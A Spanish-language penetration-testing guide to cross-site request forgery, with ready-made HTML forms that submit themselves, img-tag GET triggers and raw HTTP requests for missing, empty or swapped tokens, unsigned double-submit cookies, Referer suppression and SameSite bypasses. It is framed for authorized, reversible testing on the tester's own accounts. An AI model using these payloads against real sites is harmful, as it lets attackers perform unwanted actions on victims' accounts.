# 🗡️ Cross-Site Request Forgery (CSRF): payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Formularios cruzados reversibles

```html
<form action="https://{ORIGEN}/api/profile" method="POST"><input name="displayName" value="csrf-123"><button>Enviar prueba</button></form>
<form action="https://{ORIGEN}/api/profile" method="POST" enctype="multipart/form-data"><input name="displayName" value="csrf-123"><button>Enviar multipart</button></form>
<form action="https://{ORIGEN}/api/profile/set-name" method="GET"><input name="value" value="csrf-123"><button>Probar GET</button></form>
```

**Cuándo usarlo:** Ejecutar una alternativa cada vez sobre la cuenta propia y restaurar el estado. Verificar cookie enviada, acción efectiva y token exigido.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation).


## 🧭 Payloads por contexto

### Token ausente, vacío o de otra sesión

```http
POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_A}
Content-Type: application/x-www-form-urlencoded

displayName=csrf-123

POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_A}
Content-Type: application/x-www-form-urlencoded

csrf=&displayName=csrf-123

POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_B}
Content-Type: application/x-www-form-urlencoded

csrf={TOKEN_DE_A}&displayName=csrf-123
```

**Cuándo usarlo:** Son tres requests independientes para Repeater. Comparar con token válido; usar solo sesiones A/B propias. La aceptación debe producir un cambio real.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation).


### SameSite Lax y método alternativo

```html
<a href="https://{ORIGEN}/api/profile/set-name?value=csrf-123">Navegación GET superior</a>
<form action="https://{ORIGEN}/api/profile" method="GET"><input name="_method" value="POST"><input name="displayName" value="csrf-123"><button>Probar override</button></form>
```

**Cuándo usarlo:** La cookie Lax puede viajar en navegación superior GET. _method solo sirve si el framework lo procesa y no se exige token.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions).


## 🔥 Payloads avanzados

### SameSite Strict y gadget del sitio

```html
<a href="https://{ORIGEN}/redirect?next=%2Fapi%2Fprofile%2Fset-name%3Fvalue%3Dcsrf-123">Gadget de redirección cliente</a>
<a href="https://{SUBDOMINIO_CONTROLADO}.{ORIGEN}/prueba-csrf">Página hermana controlada</a>
```

**Cuándo usarlo:** Primera variante requiere redirección por JavaScript del sitio, no 30x HTTP; segunda exige subdominio autorizado y controlado. Registrar Origin y cookies reales.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions).


### Referer omitido

```html
<meta name="referrer" content="no-referrer"><form action="https://{ORIGEN}/api/profile" method="POST"><input name="displayName" value="csrf-123"><button>Sin Referer</button></form>
<a rel="noreferrer" href="https://{ORIGEN}/api/profile/set-name?value=csrf-123">GET sin Referer</a>
```

**Cuándo usarlo:** La defensa debe depender de Referer y omitir la validación cuando falta. En POST el navegador aún puede enviar Origin; comprobar cambio propio.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses).


### Double submit sin firma

```http
POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_A}; csrf=csrf-123
Content-Type: application/x-www-form-urlencoded

csrf=csrf-123&displayName=csrf-123

POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_A}; csrf=csrf-123
Content-Type: application/x-www-form-urlencoded

csrf=incorrecto&displayName=csrf-123
```

**Cuándo usarlo:** Requests independientes; comparar aceptación y rechazo. El bypass entre orígenes exige demostrar que se puede fijar la cookie CSRF, no solo editarla en Repeater.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation).


## 🔬 Pruebas guiadas por escenario

### 1. Formulario POST cruzado

**Objetivo:** Reproducir una acción reversible de la cuenta propia desde otro origen.

```html
<form action="https://{ORIGEN}/api/profile" method="POST"><input name="displayName" value="prueba-123"></form><script>document.forms[0].submit()</script>
```

**Interpretación:** Confirmar cambio desde la cuenta de prueba y restaurarlo. La cookie debe viajar; curl no prueba esta condición.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Cross-Site%20Request%20Forgery/README.md).

### 2. Acción GET

**Objetivo:** Detectar cambio de estado en GET sin token.

```html
<img src="https://{ORIGEN}/api/profile/set-name?value=prueba-123">
```

**Interpretación:** Requiere endpoint con efecto GET y cookie enviada por el navegador; verificar estado final propio.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation).

### 3. Token omitido

**Objetivo:** Comparar la misma acción con el parámetro CSRF completamente ausente.

```http
POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
Content-Type: application/x-www-form-urlencoded

displayName=prueba-123
```

**Interpretación:** Distinguir ausencia del campo de token vacío; el efecto debe comprobarse en backend.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation).

### 4. Validación solo en POST

**Objetivo:** Probar si la ruta equivalente acepta GET sin token.

```http
GET /api/profile?displayName=prueba-123 HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
```

**Interpretación:** Un 200 sin modificación no basta. Solo aplica si el método alternativo realmente ejecuta la acción.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation).

### 5. Token de otra sesión propia

**Objetivo:** Comprobar si un token emitido para A se acepta con sesión B.

```http
POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_B}
Content-Type: application/x-www-form-urlencoded

csrf={CSRF_DE_A}&displayName=prueba-123
```

**Interpretación:** Usar dos cuentas controladas; si cambia B, el token no está vinculado correctamente a la sesión.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation).

### 6. Double-submit sin firma

**Objetivo:** Comparar cookie y parámetro controlados con el mismo valor de prueba.

```http
POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}; csrf=prueba-123
Content-Type: application/x-www-form-urlencoded

csrf=prueba-123&displayName=prueba-123
```

**Interpretación:** Aceptar valores inventados indica validación débil, pero la explotación entre orígenes exige demostrar que puede fijarse la cookie.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation).

### 7. POST text/plain

**Objetivo:** Verificar si la API procesa cuerpo de formulario simple como JSON; probar solo en cuenta propia.

```html
<form action="https://{ORIGEN}/api/profile" method="POST" enctype="text/plain"><input name='{"displayName":"prueba-123","x":"' value='"}'></form><script>document.forms[0].submit()</script>
```

**Interpretación:** La sintaxis final depende del parser; inspeccionar request real y efecto, no inferir por la ausencia de preflight.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Cross-Site%20Request%20Forgery/README.md).

### 8. SameSite Lax y navegación superior

**Objetivo:** Comprobar una acción GET que se ejecuta al navegar directamente desde otro sitio.

```html
<a href="https://{ORIGEN}/api/profile/set-name?value=prueba-123">Abrir prueba</a>
```

**Interpretación:** La cookie Lax puede viajar en navegación GET superior; registrar comportamiento del navegador y efecto real.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions).

### 9. Token vacío

**Objetivo:** Distinguir validación de token presente pero sin valor frente a token ausente.

```http
POST /api/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={COOKIE_PROPIA}
Content-Type: application/x-www-form-urlencoded

csrf=&displayName=prueba-123
```

**Interpretación:** Comparar contra token válido, inválido y omitido. Una aceptación puede revelar una rama de validación defectuosa.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-token-validation).

### 10. Referer suprimido

**Objetivo:** Probar una defensa que solo verifica Referer cuando existe.

```html
<meta name="referrer" content="no-referrer"><form action="https://{ORIGEN}/api/profile" method="POST"><input name="displayName" value="prueba-123"></form><script>document.forms[0].submit()</script>
```

**Interpretación:** Confirmar que el navegador omitió Referer y que la acción propia se efectuó; algunas apps también validan Origin.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses).

### 11. Subdominio same-site

**Objetivo:** Comprobar un origen de prueba bajo el mismo site pero distinto origin.

```html
<!-- Hospedar en https://{SUBDOMINIO_CONTROLADO}.{ORIGEN} --><form action="https://{ORIGEN}/api/profile" method="POST"><input name="displayName" value="prueba-123"></form><script>document.forms[0].submit()</script>
```

**Interpretación:** SameSite puede enviar la cookie porque es same-site; aún debe fallar una defensa CSRF ligada a sesión u Origin.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions).

### 12. GET con _method=POST

**Objetivo:** Probar un framework que convierte una navegación GET superior en una acción POST.

```html
<form action="https://{ORIGEN}/api/profile" method="GET"><input name="_method" value="POST"><input name="displayName" value="prueba-123"></form><script>document.forms[0].submit()</script>
```

**Interpretación:** Solo existe bypass si el router reconoce _method, viaja la cookie Lax y el cambio propio se aplica sin token.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions).

### 13. SameSite Strict mediante redirección cliente

**Objetivo:** Usar un gadget de redirección JavaScript en el mismo site que navegue a una acción GET propia.

```html
<a href="https://{ORIGEN}/redirect?next=%2Fapi%2Fprofile%2Fset-name%3Fvalue%3Dprueba-123">Abrir prueba</a>
```

**Interpretación:** La segunda navegación debe originarse en JavaScript del sitio; una respuesta HTTP 30x mantiene la restricción de SameSite.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions).

### 14. Formulario multipart simple

**Objetivo:** Probar una ruta que acepta multipart/form-data sin token desde un origen ajeno.

```html
<form action="https://{ORIGEN}/api/profile" method="POST" enctype="multipart/form-data"><input name="displayName" value="prueba-123"></form><script>document.forms[0].submit()</script>
```

**Interpretación:** Inspeccionar Content-Type real, cookies y cambio reversible en cuenta propia; aceptar multipart puede ser funcionalidad normal.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Cross-Site%20Request%20Forgery/README.md).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
